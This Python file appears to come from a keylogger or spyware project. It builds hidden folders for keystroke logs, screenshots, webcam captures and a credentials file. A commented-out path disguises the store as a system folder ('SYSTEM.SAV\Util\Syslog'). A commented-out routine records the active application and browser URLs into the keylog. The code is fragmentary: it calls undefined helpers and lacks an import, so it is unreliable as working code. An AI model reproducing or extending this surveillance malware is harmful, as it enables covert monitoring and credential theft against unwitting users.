from pathlib import Path
import os
from datetime import datetime

current_date = datetime.now().strftime("%d-%B")

# Main_dir = Path(f"C:\SYSTEM.SAV\Util\Syslog\Data_{current_date}")
Main_dir = Path(f"F:\Coding\Python\CyberSce_Project\Syslog_{current_date}")

keylogger_dir = os.path.join(Main_dir, f"Keylogs")
KEYLOG_FILE = os.path.join(keylogger_dir, "Keylogs.txt")

SCREENSHOTS_dir = Path(os.path.join(Main_dir, f"ScreenShot_{current_date}"))

SNAPSHOTS_dir = os.path.join(Main_dir, "CamShots")

LOGIN_FILE = os.path.join(Main_dir, "Login")
cred_file = os.path.join(LOGIN_FILE, "credentials.txt")

dir = ['keylogger_dir', 'SCREENSHOTS_dir','SNAPSHOTS_dir', 'LOGIN_FILE']


def file_handler():
    os.makedirs(Main_dir, exist_ok=True)
    print(f"[+] Created/Verified main dir: {Main_dir}")

    child_dirs = [
        keylogger_dir,
        SNAPSHOTS_dir,
        LOGIN_FILE
    ]
    for child in child_dirs:
        os.makedirs(child, exist_ok=True)
        print(f"[+] Created/Verified child dir: {child}")



if __name__ == "__main__":
    file_handler()

'''
def update_active_app(): 
    global current_process
    prev_process = None
    prev_url = None
    browser_process_names = ["chrome.exe", "firefox.exe", "msedge.exe", "safari.exe", "brave.exe", "opera.exe"]
    
    while True:
        try:
            hwnd, process_title, process_name = get_activeApp_Data()
            url = None

            if process_title != prev_process:
                flush_buffer()
                current_process = f"\nProcess: {process_name} \nTitle: {process_title}"
                with file_lock:
                    with open(KEYLOG_FILE, 'a', encoding='utf8') as f:
                        if process_name in browser_process_names and prev_url != url:
                            url = url_detection(hwnd, process_name)
                            print(f"{current_process}\nUrl: {url if url else 'Unable to retrieve URL'}")
                            f.write(f"{current_process}\nUrl: {url if url else 'Unable to retrieve URL'}\n\n")
                        elif process_title == "":
                            f.write("\nProcess: None \nTitle: No app running on foreground\n\n")
                            print("No app running on foreground")
                        else:
                            f.write(f"{current_process}\n\n")
                            print(f"Active app changed: {current_process}")
                prev_process,prev_url = process_title, url
            time.sleep(1)
        except Exception as e:
            current_process = f"Error detecting app: {e}"
            print(f"Error in update_active_app: {e}")
            time.sleep(5) '''